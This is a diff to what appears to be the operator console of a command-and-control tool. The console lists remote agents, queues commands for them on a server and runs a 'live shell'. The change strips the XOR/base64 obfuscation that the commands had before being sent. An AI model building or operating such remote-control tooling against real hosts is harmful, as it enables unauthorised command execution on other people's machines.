@@ -7,7 +7,6 @@ with open("config.json") as f:
     cfg = json.load(f)
 
 SERVER_URL = f"http://{cfg['server_host']}:{cfg['server_port']}"
-CRYPTO_KEY = cfg.get("crypto_key", "secret")
 
 # Colors
 GREEN  = "\033[92m"
@@ -16,14 +15,6 @@ BLUE   = "\033[94m"
 YELLOW = "\033[93m"
 RESET  = "\033[0m"
 
-def xor(data: str, key=CRYPTO_KEY) -> str:
-    return "".join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
-
-def encrypt(data: str, key=CRYPTO_KEY) -> str:
-    return base64.b64encode(xor(data, key).encode()).decode()
-
-def decrypt(data: str, key=CRYPTO_KEY) -> str:
-    return xor(base64.b64decode(data.encode()).decode(), key)
 def list_agents():
     try:
         response = requests.get(f"{SERVER_URL}/agents", timeout=10)
@@ -52,7 +43,6 @@ def list_tasks(status):
 
         for count, cmd in enumerate(data, start=1):
             print(f"{YELLOW}{'-' * 100}{RESET}")
-            print(f"{YELLOW}{'-' * 100}{RESET}")
             print(f"Command Id : {cmd['Command Id']}")
             print(f"Agent Id   : {cmd['Agent Id']}")
             print(f"Command    : {cmd['Command']}")
@@ -79,7 +69,6 @@ def show_agent_commands():
 
         for count, cmd in enumerate(commands, start=1):
             print(f"{YELLOW}{'-' * 100}{RESET}")
-            print(f"{YELLOW}{'-' * 100}{RESET}")
             print(f"Command ID : {cmd['Command Id']}")
             print(f"Command    : {cmd['Command']}")
             print(f"Status     : {cmd['Status']}")
@@ -96,7 +85,7 @@ def send_command():
             f"{SERVER_URL}/queue",
             json={
                 "agent_id": id,
-                "command": encrypt(command)
+                "command": command
             },
             timeout=10
         )
@@ -141,8 +130,8 @@ def live_shell():
             print("[*] Leaving live shell...")
             break
 
-        # Queue the command (encrypted)
-        payload = {"agent_id": agent_id, "command": encrypt(command)}
+        # Queue the command (plaintext)
+        payload = {"agent_id": agent_id, "command": command}
         r = requests.post(f"{SERVER_URL}/queue", json=payload, timeout=10)
         r.raise_for_status()
         resp = r.json()
